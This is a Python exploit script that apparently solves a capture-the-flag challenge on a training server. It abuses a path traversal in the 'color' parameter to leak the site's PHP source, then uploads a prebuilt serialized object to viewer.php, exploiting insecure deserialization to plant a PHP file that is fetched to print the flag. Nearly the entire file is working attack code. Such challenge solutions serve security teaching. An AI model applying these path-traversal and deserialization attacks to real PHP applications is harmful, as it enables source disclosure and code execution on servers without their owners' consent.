import requests
import os

base_url = "http://1024.training.jinblack.it/"

# Execute Script.php to get the serialized object
os.system("php script.php")
serialized = open("serialization", "r").read()

# We need to use Serialization to get the flag, but we do not have the source code, so we need to leak it

s = requests.Session()

# The base URL has a query parameter color that downloads CSS files from the server, we can use it to leak the source code of the script.php file

index = s.get(base_url + "?color=../index.php")
viewer = s.get(base_url + "?color=../viewer.php")
replay = s.get(base_url + "?color=../replay.php")
innerGame = s.get(base_url + "?color=../innerGame.php")
history = s.get(base_url + "?color=../history.php")
game = s.get(base_url + "?color=../game.php")

open("leaked_php/index.php", "w").write(index.text.split("<style>")[1].split("</style>")[0])
open("leaked_php/viewer.php", "w").write(viewer.text.split("<style>")[1].split("</style>")[0])
open("leaked_php/replay.php", "w").write(replay.text.split("<style>")[1].split("</style>")[0])
open("leaked_php/innerGame.php", "w").write(innerGame.text.split("<style>")[1].split("</style>")[0])
open("leaked_php/history.php", "w").write(history.text.split("<style>")[1].split("</style>")[0])
open("leaked_php/game.php", "w").write(game.text.split("<style>")[1].split("</style>")[0])

# Analyzing the source code I found out that the Ranking class is vulnerable to serialization attacks
s.post(base_url + "viewer.php", files={"replay": serialized})

# Now on the server there is a PHP endpoint that prints the flag
response = s.get(base_url + "games/veryrandomfilename.php")

flag = response.text.split("flag{")[1].split("}")[0]
print("flag{" + flag + "}")